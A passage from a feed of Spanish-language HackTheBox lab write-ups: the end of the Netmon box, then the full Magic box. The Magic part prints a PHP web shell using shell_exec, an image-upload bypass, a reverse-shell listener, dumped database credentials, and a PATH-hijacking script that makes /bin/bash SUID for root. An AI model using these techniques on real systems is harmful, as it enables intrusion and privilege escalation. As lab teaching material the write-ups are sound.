&lt;p&gt;Le damos ok en la confirmación y ya deberia haberse ejecutado la acción.&lt;/p&gt;

&lt;p&gt;Como vimos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto podemos usar &lt;code&gt;crackmapexec&lt;/code&gt; y validamos que el usuario &lt;code&gt;fmiracle&lt;/code&gt; ahora existe y forma parte de los usuarios &lt;code&gt;administradores&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\pentest:p3nT3st! (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora haciendo uso del servicio de administración remota de windows, podemos conectarnos por el puerto &lt;code&gt;5985&lt;/code&gt;, usando la herramienta &lt;code&gt;evil-winrm&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'p3nT3st!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\pentest\Documents&amp;gt; cd C:\Users
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ya en el sistema podemos dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users&amp;gt; cd Administrator
*Evil-WinRM* PS C:\Users\Administrator&amp;gt; cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
491b992fe825994a2fad4199afd2ca76
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Netmon</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Netmon</guid>
        
        <category>ftp enumeration</category>
        
        <category>absing PRTG Network Monitor</category>
        
        <category>Command Injection RCE</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Magic - htb writeup</title>
        <description>&lt;p&gt;En esta ocasión vamos a resolver la máquina &lt;code&gt;Magic&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual explotaremos evadiendo el panel de logeo mediante una inyeccion simple en sql, despues aprovecharemos de una mala sanizitación de subida de archivos derivandola en una ejecución remota de comandos; una vez dentro del sistema obtendremos credenciales enumerando la base de datos y finamente aprocecharemos el permiso &lt;code&gt;suid&lt;/code&gt; de un binario, para ejecutar una &lt;code&gt;path hijacking&lt;/code&gt; que nos dara acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Magic
❯ ls
 Magic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.185
PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=137 ms

--- 10.10.10.185 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.232/137.232/137.232/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.185 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:00 GMT
Initiating SYN Stealth Scan at 21:00
Scanning 10.10.10.185 [65535 ports]
Discovered open port 80/tcp on 10.10.10.185
Discovered open port 22/tcp on 10.10.10.185
Completed SYN Stealth Scan at 21:00, 16.68s elapsed (65535 total ports)
Nmap scan report for 10.10.10.185
Host is up, received user-set (0.12s latency).
Scanned at 2023-06-13 21:00:26 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
           Raw packets sent: 82274 (3.620MB) | Rcvd: 81681 (3.267MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.185 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:01 GMT
Nmap scan report for 10.10.10.185
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.185
http://10.10.10.185 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.185], JQuery, Script, Title[Magic Portfolio]
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos seguidamente a abrir la web en nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos una que la pagina se compone de una serie de imagenes y tambien podemos ver que existe un enlace a un login que procederemos a visitar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para tratar de averiguar la ruta donde sube las imagenes, podemos usar el inspeccionador de elementos y mostrar la ruta de donde cargan las imagenes que corresponde a &lt;code&gt;/uploads&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos a tratar de logearnos con credenciales por defecto pero nos resulta imposible. Como estamos frente a un panel de logeo, podemos tratar de ocasionar un error en los inputs mediante una &lt;code&gt;sql injection&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado podemos logramos logearnos exitosamente y nos redirige a un panel donde podemos subir una imagen. Para ver si bien sanitizada la subida de archivos, probaremos con subir un archivo de nombre &lt;code&gt;cmd.php&lt;/code&gt; que mediante el uso de etiquetas preformateadas y haciendo uso de la función &lt;code&gt;shell_exec&lt;/code&gt; con el parametro &lt;code&gt;cmd&lt;/code&gt; ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
  echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a subir el archivo pero vemos que solo admite formatos de imagen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos probar a renombrar nuestro archivo &lt;code&gt;cmd.php&lt;/code&gt; y asignarle una doble extensión para asi tratar de bypasear la subida.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que esta vez cambie el mensaje de error, y detecta que estamos tratando de manipular la subida.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Debemos de tener en cuenta que en base a los &lt;code&gt;magic numbers&lt;/code&gt; que son los primeros bytes de los archivos se validan los tipos de archivos en este caso si con el comando &lt;code&gt;file&lt;/code&gt; tratamos de validar nuestro archivo &lt;code&gt;cmd.php.png&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file cmd.php.png
cmd.php.png: PHP script, ASCII text
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos detecta que es un &lt;code&gt;php script&lt;/code&gt;, pero si agregamos la cabezera &lt;code&gt;GIF8;&lt;/code&gt; al inicio de nuestro archivo ahora nos lo detectara como &lt;code&gt;gif image&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ file cmd.php.png
cmd.php.png: GIF image data 16188 x 26736
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probaremos a subir nuevamente el archivo modificado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Obtenemos el mismo error, asi que esta vez vamos a descargar una imagen cualquier de &lt;code&gt;google&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a alterar su contenido añadiendo una intrucción en &lt;code&gt;php&lt;/code&gt; y añadiendo la extensión &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Subimos nuevamente el archivo y esta vez nos lo hace correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a la ruta donde se suben las imagenes que la obtuvimos previamente y efectivamente podemos ver nuestro archivo, aunque en un formato no legible por ser binario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos si podemos ejecutar comandos gracias a la instrucción php que añadimos y tenemos ejecución de comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora con bash vamos a enviarnos una reverse shell, para ello nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt; y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.185.
Ncat: Connection from 10.10.10.185:51270.
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora como de costumbre vamos a otorgarnos una &lt;code&gt;tty full interactiva&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic/images/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm
www-data@ubuntu:/var/www/Magic/images/uploads$ export SHELL=bash 
www-data@ubuntu:/var/www/Magic/images/uploads$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si volvemos al directorio &lt;code&gt;Magic&lt;/code&gt;, encontraremos un archivo &lt;code&gt;db.php5&lt;/code&gt; el cual contiene unas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ ls
assets	db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5 
&amp;lt;?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( &quot;mysql:host=&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname=&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e-&amp;gt;getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de usar las credenciales para conectarnos como &lt;code&gt;theseus&lt;/code&gt;, vemos que no corresponde, pero podemos tratar de conectarnos a la base de datos. Y al no existir &lt;code&gt;mysql&lt;/code&gt;, podemos usar &lt;code&gt;mysqlshow&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
su: Authentication failure
www-data@ubuntu:/var/www/Magic$ mysqlshow -utheseus -piamkingtheseus
mysqlshow: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos enumerar las bases de datos utilizadas, y ahora usaremos &lt;code&gt;mysqldump&lt;/code&gt; para dumpear las datos  almancenados en la base de datos &lt;code&gt;Magic&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-06-13 15:00:33
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos unas credenciales correspondientes al usuario &lt;code&gt;theseus&lt;/code&gt;, ahora podemos migrar al usuario, dirigirnos al directorio del usuario y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$ whoami
theseus
theseus@ubuntu:/var/www/Magic$ cd /home/theseus/
theseus@ubuntu:~$ cat user.txt 
fb197a83208d0d99ecdbed4ee83fc4f0
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listamos los archivos con privilegios &lt;code&gt;suid&lt;/code&gt;, vemos uno inusual &lt;code&gt;/bin/sysinfo&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ find / -perm -4000 2&amp;gt;/dev/null | grep -v &quot;snap&quot;
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vemos los caracteres imprimibles del binario con la ayuda de &lt;code&gt;strings&lt;/code&gt;, podemos ver que hace uso del comando &lt;code&gt;fdisk&lt;/code&gt;, de manera relativa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ strings /bin/sysinfo
/lib64/ld-linux-x86-64.so.2
libstdc++.so.6
__gmon_start__
_ITM_deregisterTMCloneTable
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
;*3$&quot;
zPLR
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que haremos ahora sera efectuar un &lt;code&gt;path hijacking&lt;/code&gt;, donde alteraremos la ruta de nuestro &lt;code&gt;path&lt;/code&gt; y crearemos un archivo de nombre &lt;code&gt;fdisk&lt;/code&gt; donde le otorgaremos el privilegio &lt;code&gt;suid a la bash&lt;/code&gt;, de modo tal que al ejecutar &lt;code&gt;/bin/sysinfo&lt;/code&gt; hara uso del comando &lt;code&gt;fdisk&lt;/code&gt; y al haber manipulado nuestro &lt;code&gt;path&lt;/code&gt; lo hara desde la ruta actual que especifiquemos donde tendremos nuestro archivo creado, esto debido a que &lt;code&gt;fdisk&lt;/code&gt; no se esta aplicando de manera absoluta.&lt;/p&gt;

&lt;p&gt;Te dejo el siguiente articulo para que veas mas a fondo esta vulnerabilidad.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&quot;&gt;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Procedemos a crearnos el archivo en la ruta &lt;code&gt;/tmp&lt;/code&gt;, que generalamente es donde se tiene permiso de escritura y le damos permiso de ejecución.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ cat fdisk 
#!/bin/bash

chmod u+s /bin/bash
theseus@ubuntu:/tmp$ chmod +x fdisk
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora manilupalaremos nuestro &lt;code&gt;path&lt;/code&gt; para que este tire desde la ruta &lt;code&gt;/tmp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
theseus@ubuntu:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;/bin/sysinfo&lt;/code&gt; y vemos el privilegios de la &lt;code&gt;/bin/bash&lt;/code&gt; fue asignado correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ /bin/sysinfo
====================Hardware Info====================
H/W path           Device     Class      Description
====================================================
                              system     VMware Virtual Platform
/0                            bus        440BX Desktop Reference Platform

theseus@ubuntu:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos ejecutar el comando &lt;code&gt;bash -p&lt;/code&gt; y estariamos como el usuario &lt;code&gt;root&lt;/code&gt;, seguidamente podemos dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# cat root.txt 
a4f562d7949903aa1bf84994c94ce9e3
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Magic</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Magic</guid>
        
        <category>sql injection</category>
        
        <category>bypass upload file</category>
        
        <category>information leaked</category>
        
        <category>abusing mysql</category>
        
        <category>absusing suid</category>
        
        <category>path hijacking</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Compromised - htb writeup</title>
